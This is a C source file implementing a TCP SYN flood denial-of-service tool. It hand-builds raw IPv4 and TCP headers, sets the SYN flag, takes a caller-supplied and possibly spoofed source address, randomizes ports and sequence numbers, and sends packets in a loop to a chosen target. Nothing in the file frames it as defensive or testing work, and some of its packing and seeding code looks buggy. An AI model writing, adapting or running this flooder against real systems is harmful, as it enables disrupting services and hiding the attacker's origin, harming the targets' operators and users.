#include "dos_syn.h"

static Buffer buf;

static void copy_ip_version_ihl(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {((payload->ip->version) << 4) | (payload->ip->ihl)};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_tos(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->tos};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_total_length(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->total_length) >> 8),
        ((payload->ip->total_length) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_identification(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->identification) >> 8),
        ((payload->ip->identification) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_flags_fragment_offset(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->flags) << 5) | ((payload->ip->fragment_offset) >> 8),
        ((payload->ip->flags) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_ttl(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->ttl};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_protocol(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->protocol};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->checksum) >> 8),
        ((payload->ip->checksum) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_src_dst_addr(Buffer *buf, Payload *payload) {
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), payload->ip->src_addr, sizeof (payload->ip->src_addr));
    (buf->index) += 4;
    index += 4;
    memcpy((tmp_buf + index), payload->ip->dst_addr, sizeof (payload->ip->dst_addr));
    (buf->index) += 4;
    index += 4;
    return;
}

static void copy_tcp_src_port(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->src_port) >> 8),
        ((payload->tcp->src_port) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_dst_port(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->dst_port) >> 8),
        ((payload->tcp->dst_port) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_sequence(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[4] = {
        ((payload->tcp->sequence) >> 24),
        ((payload->tcp->sequence) >> 16) & 0xff,
        ((payload->tcp->sequence) >> 8) & 0xff,
        ((payload->tcp->sequence) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_acknowledgement(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[4] = {
        ((payload->tcp->acknowledgement) >> 24),
        ((payload->tcp->acknowledgement) >> 16) & 0xff,
        ((payload->tcp->acknowledgement) >> 8) & 0xff,
        ((payload->tcp->acknowledgement) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_data_offset(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {((payload->tcp->data_offset) << 4)};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_flags(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {
        ((payload->tcp->cwr) << 7) |
        ((payload->tcp->ece) << 6) |
        ((payload->tcp->urg) << 5) |
        ((payload->tcp->ack) << 4) |
        ((payload->tcp->psh) << 3) |
        ((payload->tcp->rst) << 2) |
        ((payload->tcp->syn) << 1) |
        ((payload->tcp->fin) << 0)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_window(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->window) >> 8),
        ((payload->tcp->window) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->checksum) >> 8),
        ((payload->tcp->checksum) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_urgent_pointer(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {0, 0};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_pseudo_zeros(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {0};
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static void copy_tcp_pseudo_protocol(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {PROTOCOL_NUMBER};
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static void copy_tcp_pseudo_tcp_length(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {0, TCP_HEADER_SIZE};
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static int checksum(unsigned char *buf, size_t buf_len) {
    unsigned long value = 0;
    unsigned long word = 0;
    size_t i;
    for (i = 0; i < buf_len; i += 2) {
        word = (buf[i] << 8) + (i + 1 < buf_len ? buf[i + 1] : 0);
        value += word;
    }
    value = (value >> 16) + (value & 0xffff);
    value = (~value & 0xffff);
    return (int) value;
}

static void handle_ip_checksum(Buffer *buf, Payload *payload) {
    payload->ip->checksum = checksum(buf->buffer, buf->ip_length);
    buf->index = 10;
    copy_ip_checksum(buf, payload);
    buf->index = buf->ip_length;
    return;
}

static void handle_tcp_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_buf[(buf->tcp_length) + (buf->tcp_pseudo_length)];
    buf->index = buf->ip_length;
    memcpy(tmp_buf, ((buf->buffer) + (buf->index)), (size_t) buf->tcp_length);
    pack_tcp_pseudo_header((tmp_buf + buf->tcp_length), payload);
    payload->tcp->checksum = checksum(tmp_buf, sizeof (tmp_buf));
    buf->index = (buf->ip_length + 16);
    copy_tcp_checksum(buf, payload);
    buf->index = (buf->ip_length + buf->tcp_length);
    return;
}

static unsigned int get_random_port(void) {
    srand(time(NULL));
    return (rand() % MAX_RANDOM_RANGE);
}

static unsigned int get_random_identification(void) {
    srand(time(NULL));
    return (rand() % MAX_RANDOM_IDENTIFICATION);
}

static unsigned long get_random_sequence(void) {
    srand(time(NULL));
    return (rand() % MAX_RANDOM_SEQUENCE);
}

static void convert_addr_to_number(unsigned char *addr, struct in_addr *ip_addr) {
    ip_addr->s_addr = (
        (addr[0] << 24) |
        (addr[1] << 16) |
        (addr[2] << 8)  |
        (addr[3])
    );
    return;
}

static void reset_headers(IPv4_Header *ip, TCP_Header *tcp) {
    ip->identification = 0;
    ip->checksum = 0;
    tcp->src_port = 0;
    tcp->dst_port = 0;
    tcp->sequence = 0;
    tcp->checksum = 0;
    return;
}

static void randomize_headers(IPv4_Header *ip, TCP_Header *tcp, struct sockaddr_in *addr, DoS_SYN_args *args) {
    unsigned int random_port = get_random_port();
    ip->identification = get_random_identification();
    tcp->src_port = get_random_port();
    tcp->dst_port = (args->rand_port == 1) ? (random_port) : (args->port);
    addr->sin_port = (args->rand_port == 1) ? (htons(random_port)) : (htons(args->port));
    tcp->sequence = get_random_sequence();
    return;
}

static void init_sockaddr_in_structure(struct sockaddr_in *addr, struct in_addr *ip_addr) {
    addr->sin_family = AF_INET;
    addr->sin_port = htons(0x0);
    addr->sin_addr = *ip_addr;
    return;
}

unsigned int init_socket(void) {
    signed int sockfd;
    signed int setsockopt_status;
    unsigned short optval = 1;
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt_status = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, (socklen_t) sizeof (optval));
    /* TODO : log errno value */
    return (sockfd | setsockopt_status != -1) ? sockfd : 0;
}

void init_buffer(Buffer *buf) {
    buf->buffer = malloc(PAYLOAD_SIZE * sizeof(char));
    buf->index = 0;
    buf->ip_length = IP_HEADER_SIZE;
    buf->tcp_length = TCP_HEADER_SIZE;
    buf->tcp_pseudo_length = TCP_PSEUDO_HEADER_SIZE;
    return;
}

void init_ipv4_header_structure(IPv4_Header *ip, DoS_SYN_args *args) {
    ip->version = 0x4;
    ip->ihl = 0x5;
    ip->tos = 0x0;
    ip->total_length = PAYLOAD_SIZE;
    ip->identification = ip->flags = ip->fragment_offset = 0x0;
    ip->ttl = 0xff;
    ip->protocol = PROTOCOL_NUMBER;
    ip->checksum = 0x0;
    memcpy(ip->src_addr, args->src_addr, sizeof (args->src_addr));
    memcpy(ip->dst_addr, args->dst_addr, sizeof (args->dst_addr));
    return;
}

void init_tcp_header_structure(TCP_Header *tcp, DoS_SYN_args *args) {
    tcp->src_port = tcp->dst_port = 0x0;
    tcp->sequence = tcp->acknowledgement = 0x0;
    tcp->data_offset = 0x5;
    tcp->cwr = tcp->ece = tcp->urg = tcp->ack = 0x0;
    tcp->psh = tcp->rst = tcp->fin = 0x0;
    tcp->syn = 0x1;
    tcp->window = 0xffff;
    tcp->checksum = tcp->urgent_pointer = 0x0;
    return;
}

void init_tcp_pseudo_header_structure(TCP_Pseudo_Header *pseudo, DoS_SYN_args *args) {
    memcpy(pseudo->src_addr, args->src_addr, sizeof (args->src_addr));
    memcpy(pseudo->dst_addr, args->dst_addr, sizeof (args->dst_addr));
    pseudo->zeros = 0x0;
    pseudo->protocol = PROTOCOL_NUMBER;
    pseudo->tcp_length = TCP_HEADER_SIZE;
    return;
}


void pack_ipv4_header(Buffer *buf, Payload *payload) {
    copy_ip_version_ihl(buf, payload);
    copy_ip_tos(buf, payload);
    copy_ip_total_length(buf, payload);
    copy_ip_identification(buf, payload);
    copy_ip_flags_fragment_offset(buf, payload);
    copy_ip_ttl(buf, payload);
    copy_ip_protocol(buf, payload);
    copy_ip_checksum(buf, payload);
    copy_ip_src_dst_addr(buf, payload);
    return;
}

void pack_tcp_header(Buffer *buf, Payload *payload) {
    copy_tcp_src_port(buf, payload);
    copy_tcp_dst_port(buf, payload);
    copy_tcp_sequence(buf, payload);
    copy_tcp_acknowledgement(buf, payload);
    copy_tcp_data_offset(buf, payload);
    copy_tcp_flags(buf, payload);
    copy_tcp_window(buf, payload);
    copy_tcp_checksum(buf, payload);
    copy_tcp_urgent_pointer(buf, payload);
    return;
}

void pack_tcp_pseudo_header(unsigned char *buf, Payload *payload) {
    unsigned char index = 0;
    memcpy(buf, payload->pseudo->src_addr, sizeof (payload->pseudo->src_addr));
    index += 4;
    memcpy((buf + index), payload->pseudo->dst_addr, sizeof (payload->pseudo->dst_addr));
    index += 4;
    copy_tcp_pseudo_zeros((buf + index), payload);
    index++;
    copy_tcp_pseudo_protocol((buf + index), payload);
    index++;
    copy_tcp_pseudo_tcp_length((buf + index), payload);
    return;
}

unsigned int push_payload(int sockfd, Buffer *buf, Payload *payload, struct sockaddr_in *addr) {
    signed short length;
    struct sockaddr *temp_send_addr = (struct sockaddr *) addr;
    pack_ipv4_header(buf, payload);
    handle_ip_checksum(buf, payload);
    pack_tcp_header(buf, payload);
    handle_tcp_checksum(buf, payload);
    length = sendto(sockfd, buf->buffer, PAYLOAD_SIZE, 0, temp_send_addr, (socklen_t) sizeof (struct sockaddr_in));
    shutdown(sockfd, SHUT_RD);
    /* TODO : log errno value */
    return ((length == 0) ? 0 : 1);
}

unsigned int flood(DoS_SYN_args *args) {
    unsigned int sockfd;
    struct sockaddr_in addr;
    struct in_addr ip_addr;
    convert_addr_to_number(args->dst_addr, &ip_addr);
    init_sockaddr_in_structure(&addr, &ip_addr);
    sockfd = init_socket();
    init_buffer(&buf);
    IPv4_Header ip;
    TCP_Header tcp;
    TCP_Pseudo_Header pseudo;
    init_ipv4_header_structure(&ip, args);
    init_tcp_header_structure(&tcp, args);
    init_tcp_pseudo_header_structure(&pseudo, args);
    Payload payload = {&ip, &tcp, &pseudo};
    while ((args->count)--) {
        randomize_headers(&ip, &tcp, &addr, args);
        push_payload(sockfd, &buf, &payload, &addr);
        reset_headers(&ip, &tcp);
        buf.index = 0;
        sleep(args->wait_time);
        /* TODO : rafactoring */
    }
    free_buffer();
    return 0;
}

void free_buffer(void) {
    free(buf.buffer);
    return;
}
